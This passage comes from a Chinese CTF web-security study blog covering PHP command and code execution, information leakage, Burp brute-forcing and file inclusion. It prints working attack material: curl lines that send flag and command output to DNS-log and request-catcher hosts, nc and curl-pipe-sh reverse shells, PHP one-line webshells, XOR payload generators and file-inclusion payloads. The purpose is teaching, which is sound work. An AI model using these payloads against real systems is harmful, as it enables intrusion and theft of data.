<h5 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h5><p>可以用 <code>&gt;</code> 写入</p>
<h5 id="dns通道"><a href="#dns通道" class="headerlink" title="dns通道"></a>dns通道</h5><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
<p>当文件过长无法全部回带时，可以部分回带，使用sed -n命令</p>
<p>可以使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=`sed -n &quot;3,4p&quot; fla?.php|base64`;curl $&#123;a:0:10&#125;.dnslog.cn #a中，从0开始截取10个，然后从10再截取，依此类推</span><br></pre></td></tr></table></figure>

<p>当dnslog被过滤时，可以使用</p>
<p><a href="https://requestrepo.com/#/">https://requestrepo.com/#/</a></p>
<p><a href="https://pipedream.com/">https://pipedream.com/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X POST --data a=`cat ./flag.php` http:/xxxx.com #POST</span><br><span class="line">curl http://xxx.com/?a=`whoami` #GET</span><br></pre></td></tr></table></figure>

<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>以及ctfshow专用反弹shell<a href="https://your-shell.com/">https://your-shell.com/</a></p>
<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>盲注猜flag</p>
<h2 id="第三节-php的代码执行"><a href="#第三节-php的代码执行" class="headerlink" title="第三节 php的代码执行"></a>第三节 php的代码执行</h2><h3 id="0x1-什么是php的代码执行"><a href="#0x1-什么是php的代码执行" class="headerlink" title="0x1 什么是php的代码执行"></a>0x1 什么是php的代码执行</h3><p><code>eval(&quot;要执行的代码&quot;);</code> 可以执行参数给的php代码</p>
<p>可以用?&gt;结束php代码。</p>
<h3 id="0x2-代码执行和命令执行的区别"><a href="#0x2-代码执行和命令执行的区别" class="headerlink" title="0x2 代码执行和命令执行的区别"></a>0x2 代码执行和命令执行的区别</h3><ul>
<li><input checked="" disabled="" type="checkbox"> system 命令执行</li>
<li><input checked="" disabled="" type="checkbox"> shell_exec 命令执行</li>
<li><input checked="" disabled="" type="checkbox"> eval 代码执行</li>
</ul>
<h3 id="0x3-php的代码执行是什么格式"><a href="#0x3-php的代码执行是什么格式" class="headerlink" title="0x3 php的代码执行是什么格式"></a>0x3 php的代码执行是什么格式</h3><p>在php语言中，代码分为三种</p>
<p>1.函数调用</p>
<p>函数名 (函数参数1，函数参数2 …);</p>
<p>2.类方法调用</p>
<p>类实例 箭头 类方法 ()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$_GET</span>[<span class="number">1</span>])(<span class="variable">$_GET</span>[<span class="number">2</span>]); <span class="comment">//免杀一句话木马</span></span><br></pre></td></tr></table></figure>

<p>3.语言结构调用</p>
<h3 id="0x4-php的代码执行后门"><a href="#0x4-php的代码执行后门" class="headerlink" title="0x4 php的代码执行后门"></a>0x4 php的代码执行后门</h3><p>一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">//蚁剑连接</span></span><br></pre></td></tr></table></figure>

<p>get转post转接头</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?<span class="number">1</span>=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="0x5-代码执行的类型"><a href="#0x5-代码执行的类型" class="headerlink" title="0x5 代码执行的类型"></a>0x5 代码执行的类型</h3><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png" alt="image-20220905205127371"></p>
<p><code>(&quot;sys&quot;.&quot;tem&quot;)=system</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_POST[<span class="number">1</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>php5.6版本以前的可用</p>
<p>最短木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>`<span class="variable">$_GET</span>[<span class="number">2</span>]`;&amp;<span class="number">2</span>=</span><br></pre></td></tr></table></figure>

<p>反弹 shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc ip port -e /bin/sh #传统姿势</span><br><span class="line">curl https://your-shell.com/ip:port |sh #ctfshow新姿势</span><br></pre></td></tr></table></figure>

<h2 id="烧姿势"><a href="#烧姿势" class="headerlink" title="烧姿势"></a>烧姿势</h2><h4 id="1-无字母数字命令执行"><a href="#1-无字母数字命令执行" class="headerlink" title="1.无字母数字命令执行"></a>1.无字母数字命令执行</h4><p>采用文件上传的方式，匹配到temp目录下的文件，在该文件中写入命令执行代码</p>
<p>这里搬用一下ctfshow师傅写的upload代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://靶场地址/?cmd=. /???/????????[@-[]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>匹配临时文件，写入命令，实现命令执行</p>
<p>这里开一个靶场写一下详细过程</p>
<p>这里我们把upload.html挂到PHP study</p>
<p>然后随便传一个.txt</p>
<p>打开bp，开抓</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071106066.png" alt="image-20220907110602945"></p>
<p>我们发到repeater</p>
<p>然后把我们1.txt文件中的内容改成要执行的命令，发包!</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071111453.png" alt="image-20220907111148387"></p>
<p>成功，如果不成功可以多发几次，因为我们匹配的文件名是未知的，能否正确匹配也是概率事件，多发几次就会成功。</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071114216.png" alt="image-20220907111400146"></p>
<h4 id="2-无字母数字代码执行"><a href="#2-无字母数字代码执行" class="headerlink" title="2.无字母数字代码执行"></a>2.无字母数字代码执行</h4><p>这里我们有两个脚本</p>
<p>作者都来自羽师傅</p>
<p>首先是一个php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                                        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们把他挂在PHP study，会在本地生成一个<code>xor_rce.txt</code></p>
<p>然后是一个python脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们跑一下，在<code>function：</code>和<code>command：</code>下分别填入我们想要执行的命令</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071133034.png" alt="image-20220907113334808"></p>
<p>然后就会生成一串异或出来的命令，复制执行即可</p>
<p>这里的<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;);</code></p>
<p>虽然看上去存在一些数字字母，但是都是url编码后的，我们可以解码看一下</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071137175.png" alt="image-20220907113751127" style="zoom:50%;" />

<p>是一些不可见字符昂</p>
<h4 id="3-巧用蚁剑插件当脚本小子"><a href="#3-巧用蚁剑插件当脚本小子" class="headerlink" title="3.巧用蚁剑插件当脚本小子"></a>3.巧用蚁剑插件当脚本小子</h4><p>在这开始我们要准备一个比较新的中国蚁剑，不要像我一样，打开2016版的蚁剑</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071659033.png" alt="image-20220907165937928"></p>
<p>打开2019版的蚁剑，至少插件商城能用</p>
<p>装几个插件，这是比较有用的几个，当然根据自己需求在商城里随便装</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071701964.png" alt="image-20220907170134913"></p>
<p>这里我们不再赘述一句话木马的上传，这时候我们一句话已经连上了，但是无论是读取flag，还是命令执行都没用</p>
<p>然后，来到上传后的提权/绕过操作</p>
<p>加载disable_functions,选择第一个LD_PRELOAD，开始</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071717134.png" alt="image-20220907171716075"></p>
<p>能看到当前目录下生成了一个<code>.antproxy.php</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722782.png" alt="image-20220907172202728"></p>
<p>我们直接连这个文件</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722408.png" alt="image-20220907172258368"></p>
<p>这时候我们回到终端<code>whoami</code></p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071726093.png" alt="image-20220907172642064" style="zoom: 80%;" />

<p>注意这里不要打成<code>who m ai 👴！</code></p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071727973.png" alt="image-20220907172723929" style="zoom:67%;" />

<p>然后我们cat试试</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071728837.png" alt="image-20220907172800805"></p>
<p>没有权限，看来www-data权限还不够，会不会有其他命令，不用root权限，却能代替cat</p>
<p>这里来一些Linux知识</p>
<blockquote>
<p>在linux下我们经常用到的四个应用程序的目录是/bin、/sbin、/usr/bin、/usr/sbin 。而四者存放的文件一般如下：</p>
<p><strong>bin目录:</strong> </p>
<p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</p>
<p><strong>/usr/bin目录:</strong></p>
<p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb</em>、wget等。</p>
<p><strong>/sbin目录:</strong> </p>
<p>主要放置一些系统管理的必备程序例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。</p>
<p><strong>/usr/sbin目录:</strong> </p>
<p>放置一些网路管理的必备程序例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等</p>
<p><strong>综述：</strong></p>
<p>如果这是用户和管理员必备的二进制文件，就会放在/bin。如果这是系统管理员必备，但是一般用户根本不会用到的二进制文件，就会放在 /sbin。</p>
<p>相对而言。如果不是用户必备的二进制文件，多半会放在/usr/bin；如果不是系统管理员必备的工具，多半会放在/usr/sbin</p>
</blockquote>
<blockquote>
<p>单纯使用ls命令，显示的内容有限。在实际使用的时候，经常需要搭配一些选项来显示更加丰富的内容，ls常用的附加选项如下表所示：</p>
<p>-a    显示指定路径中的所有文件，包括隐藏文件<br>-l    显示文件的详细信息，包括文件类型，权限，所属用户，所属用户组，文件大小，上一次修改时间等<br>-h    文件大小以KBytes为单位显示<br>-S    按照文件大小顺序显示，默认从大到小；若要从小到大，可使用-Sr</p>
</blockquote>
<p>我们 <code>ls -al /usr/bin</code>发现（这里是fuzz的，其他题也行需要<code>ls -al</code> 其他文件夹，甚至可以<code>ls -al /*/*</code>）</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071734337.png" alt="image-20220907173454307"></p>
<p>这里的<code>-rwsr-sr-x</code></p>
<blockquote>
<p>第一个s代表的是suid：<br>他表示当其他的用户执行此命令时，可以取得和此文件的所有者一样的权限来取得系统资源<br>第而个s代表的是sgid：<br>他表示当其他的用户执行此命令时，可以取得和此文件的属组一样的权限来取得系统资源</p>
</blockquote>
<p>总之，<code>tac</code> 可用</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071741558.png" alt="image-20220907174119532"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_1_简单信息搜集+burp基本使用</title>
    <url>/2022/09/02/web_1/</url>
    <content><![CDATA[<h2 id="第一节-初始化学习"><a href="#第一节-初始化学习" class="headerlink" title="第一节  初始化学习"></a>第一节  初始化学习</h2><h3 id="0x1给自己起一个响亮的花名"><a href="#0x1给自己起一个响亮的花名" class="headerlink" title="0x1给自己起一个响亮的花名"></a>0x1给自己起一个响亮的花名</h3><h3 id="0x2分队"><a href="#0x2分队" class="headerlink" title="0x2分队"></a>0x2分队</h3><p>两队互相激励</p>
<h3 id="0x3记笔记-blog"><a href="#0x3记笔记-blog" class="headerlink" title="0x3记笔记/blog"></a>0x3记笔记/blog</h3><p>wanan师傅教搭建blog了，应该已经搭好了</p>
<h3 id="0x4环境-amp-amp-约定"><a href="#0x4环境-amp-amp-约定" class="headerlink" title="0x4环境&amp;&amp;约定"></a>0x4环境&amp;&amp;约定</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>有一台电脑</p>
<h4 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h4><p>flag 题目答案</p>
<p>poc 漏洞演示，不具有工具性</p>
<p>exp 直接进行漏洞利用</p>
<p>脚本 自动化代码</p>
<h2 id="第二节-认识漏洞"><a href="#第二节-认识漏洞" class="headerlink" title="第二节 认识漏洞"></a>第二节 认识漏洞</h2><h3 id="0x1-什么是漏洞"><a href="#0x1-什么是漏洞" class="headerlink" title="0x1 什么是漏洞"></a>0x1 什么是漏洞</h3><p>WEB漏洞通常是指网站程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，常见的WEB漏洞有Sql注入、Xss漏洞、上传漏洞等。</p>
<p><code>摘自百度百科</code></p>
<h3 id="0x2-漏洞产生的原因"><a href="#0x2-漏洞产生的原因" class="headerlink" title="0x2 漏洞产生的原因"></a>0x2 漏洞产生的原因</h3><h3 id="0x3-漏洞的利用"><a href="#0x3-漏洞的利用" class="headerlink" title="0x3 漏洞的利用"></a>0x3 漏洞的利用</h3><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209011935565.png" alt="image-20220901193532517"></p>
<h3 id="0x4-做题思路"><a href="#0x4-做题思路" class="headerlink" title="0x4 做题思路"></a>0x4 做题思路</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>先文件读取，再文件写入，再命令执行</p>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>判断漏洞类型</p>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>找flag</p>
<h2 id="第三节-信息泄露"><a href="#第三节-信息泄露" class="headerlink" title="第三节 信息泄露"></a>第三节 信息泄露</h2><h3 id="0x1-类型"><a href="#0x1-类型" class="headerlink" title="0x1 类型"></a>0x1 类型</h3><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209011941653.png" alt="image-20220901194121614"></p>
<h3 id="0x2-漏洞利用"><a href="#0x2-漏洞利用" class="headerlink" title="0x2 漏洞利用"></a>0x2 漏洞利用</h3><h4 id="1-http头部信息"><a href="#1-http头部信息" class="headerlink" title="1 http头部信息"></a>1 http头部信息</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209011944729.png" alt="image-20220901194455667"></p>
<p><code>baidu.com/1.jsp</code></p>
<p>F12 可以看到前端可能是阿帕奇</p>
<p><code>baiducom/index.php</code></p>
<p>server 成为了 BWS/1.1</p>
<h4 id="2-报错信息"><a href="#2-报错信息" class="headerlink" title="2 报错信息"></a>2 报错信息</h4><h4 id="3-页面信息"><a href="#3-页面信息" class="headerlink" title="3 页面信息"></a>3 页面信息</h4><h4 id="4-robots-txt"><a href="#4-robots-txt" class="headerlink" title="4 robots.txt"></a>4 robots.txt</h4><p>防君子不防小人</p>
<p>此地无银三百两</p>
<h4 id="5-git"><a href="#5-git" class="headerlink" title="5 .git"></a>5 .git</h4><p>githack</p>
<p>使用方法</p>
<p><code>python githack.py http://charmersix.icu/.git/</code></p>
<p>跑完之后会在本地生成一个文件夹，里边有重要信息</p>
<p>/.git/ 403表示此目录存在</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209012043688.png" alt="image-20220901204332656"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209012049019.png" alt="image-20220901204920987"></p>
<p><a href="https://buuoj.cn/challenges">buu题目Nu1l</a></p>
<h2 id="第四节-burp-suite"><a href="#第四节-burp-suite" class="headerlink" title="第四节 burp suite"></a>第四节 burp suite</h2><p>抓包，爆破</p>
<p>bp的安装，Java环境，proxy插件</p>
<p>设置好代理，开启拦截，刷新一下你的浏览器就可以看见抓到的包</p>
<p>这里我们以bugku的一个题目为例子，演示一下使用bp进行爆破</p>
<p><a href="https://ctf.bugku.com/challenges/detail/id/314.html">题目链接</a></p>
<p>现在我们打开题目，开启拦截</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209021153449.png" alt="image-20220902115302313"></p>
<p>然后我们往里填一个自己猜的密码，比如我这里是123456</p>
<p>点提交，就能看见自己抓的包</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209021155540.png" alt="image-20220902115559500"></p>
<p>这里可以看见我们已经抓到了，我们点鼠标右键，发送到intruder</p>
<p>来到位置这里，我们可以把admin位置删掉，因为一开始admin给出了，不需要我们爆破</p>
<p>只需要删除admin两边的§符号即可</p>
<p>我们继续看下一栏</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209021200275.png" alt="image-20220902120007229"></p>
<p>这里选择简单列表即可，然后导入我们从网上下载的top1000密码，开始爆破</p>
<p>失败</p>
<p>通过观察相应包，我们发现，无论是否爆破成功，这里都会通过js告诉你爆破失败</p>
<p>那我么只需要过滤掉<code>&#123;code: &#39;bugku10000&#39;&#125;</code>就能知道，到底哪个是真正被爆破成功的</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209021218953.png" alt="image-20220902121838909"></p>
<p>然后爆破，就能出密码</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>burpsuite</tag>
        <tag>F12</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_3_PHP文件包含</title>
    <url>/2022/09/10/web_3/</url>
    <content><![CDATA[<h2 id="第一节-php文件包含"><a href="#第一节-php文件包含" class="headerlink" title="第一节 php文件包含"></a>第一节 php文件包含</h2><h3 id="0x1文件包含的本质"><a href="#0x1文件包含的本质" class="headerlink" title="0x1文件包含的本质"></a>0x1文件包含的本质</h3><p>指定一个文件，用函数作为接口调用。</p>
<h3 id="0x2文件包含常见函数"><a href="#0x2文件包含常见函数" class="headerlink" title="0x2文件包含常见函数"></a>0x2文件包含常见函数</h3><p>include、require、include_once、require_once</p>
<ul>
<li>include 仅仅是包含，包含不到不影响后续执行</li>
<li>require 必须包含成功、包含不到就报错不再执行</li>
<li>include_once 包含一次，再次包含同样文件不再重复包含</li>
<li>require_once 同上包含一次</li>
</ul>
<h3 id="0x3伪协议"><a href="#0x3伪协议" class="headerlink" title="0x3伪协议"></a>0x3伪协议</h3><h4 id="计算机中的协议"><a href="#计算机中的协议" class="headerlink" title="计算机中的协议"></a>计算机中的协议</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209072048708.png" alt="image-20220907204814672"></p>
<h4 id="php中的伪协议"><a href="#php中的伪协议" class="headerlink" title="php中的伪协议"></a>php中的伪协议</h4><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><p>Linux php中可以自己计算目录，可以存在虚拟目录，可以../很多</p>
<h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><h4 id="ftp协议"><a href="#ftp协议" class="headerlink" title="ftp协议"></a>ftp协议</h4><h4 id="php协议"><a href="#php协议" class="headerlink" title="php协议"></a>php协议</h4><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>直接post发包即可</p>
<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p>是一种原封装器</p>
<p>参数</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>resource=&lt;要过滤的数据流&gt;</em></td>
<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td><em>read=&lt;读链的筛选列表&gt;</em></td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td><em>write=&lt;写链的筛选列表&gt;</em></td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td><em>&lt;；两个链的筛选列表&gt;</em></td>
<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀         的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<p>简言之，resource是数据来源，write写入，read读取</p>
<p>base64绕过</p>
<p><code>?file=php://filter/write=convert.base64-decode/resource=1.php</code></p>
<p>这里我们还需要post发包写入的内容，而且要base64编码后</p>
<p>rot13绕过</p>
<p><code>?file=php://filter/write=string.rot13/resource=1.php</code></p>
<p>这里同样需要post发包写入的内容，而且要rot13编码后，这里还是推荐<a href="https://ctf.mzy0.com/CyberChef3/#recipe=ROT13(true,true,false,13)">CyberChef</a></p>
<h4 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h4><p>可以直接执行里边代码内容</p>
<h5 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h5><p>我们可以在官方文档中看到它的语法</p>
<p><a href="http://www.faqs.org/rfcs/rfc2397.html">http://www.faqs.org/rfcs/rfc2397.html</a></p>
<p><code>?file=data:,&lt;?php phpinfo(); ?&gt;</code></p>
<h2 id="第二节-文件包含高级利用"><a href="#第二节-文件包含高级利用" class="headerlink" title="第二节 文件包含高级利用"></a>第二节 文件包含高级利用</h2><h3 id="文件包含可控点"><a href="#文件包含可控点" class="headerlink" title="文件包含可控点"></a>文件包含可控点</h3><ul>
<li>文件名可控</li>
<li>后缀可控</li>
</ul>
<h4 id="文件名可控"><a href="#文件名可控" class="headerlink" title="文件名可控"></a>文件名可控</h4><p>意味着可以控制协议头</p>
<p>这时候优先使用data协议</p>
<h4 id="后缀可控"><a href="#后缀可控" class="headerlink" title="后缀可控"></a>后缀可控</h4><p>可以考虑路径跳转，参考file协议</p>
<p>直接疯狂../../../../之前是提到过Linux对于../能自己计算</p>
<h3 id="nginx日志包含"><a href="#nginx日志包含" class="headerlink" title="nginx日志包含"></a>nginx日志包含</h3><p>nginx 的默认路径 <code>/var/log/nginx/access.log</code></p>
<p>这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行</p>
